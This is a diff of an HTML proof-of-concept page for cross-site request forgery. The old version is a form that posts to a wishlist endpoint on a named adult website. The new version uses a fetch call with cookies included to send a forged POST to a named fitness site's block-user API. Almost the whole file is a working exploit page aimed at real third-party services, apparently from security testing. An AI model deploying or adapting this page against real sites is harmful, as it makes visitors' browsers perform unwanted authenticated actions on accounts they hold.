@@ -1,12 +1,23 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
   <body>
-    <h3>Click the button to send the CSRF POST request.</h3>
+    <h2>CSRF PoC — Block User</h2>
+    <button onclick="sendCSRF()">Click to send request</button>
 
-    <form action="https://www.mydirtyhobby.com/wishlist/manage/item/11970671/1/videoplayer" method="POST">
-      <button type="submit">Trigger Wishlist Request</button>
-    </form>
-
-    <p><i>If the server accepts this POST from a cross-origin page, it's vulnerable.</i></p>
+    <script>
+      function sendCSRF() {
+        fetch("https://www.myfitnesspal.com/api/services/blocked_users/block", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({"username":"MyFitnessPal"}),
+          credentials: "include" // include cookies
+        })
+        .then(r => r.text())
+        .then(t => console.log("Response:", t))
+        .catch(e => console.error(e));
+      }
+    </script>
   </body>
 </html>
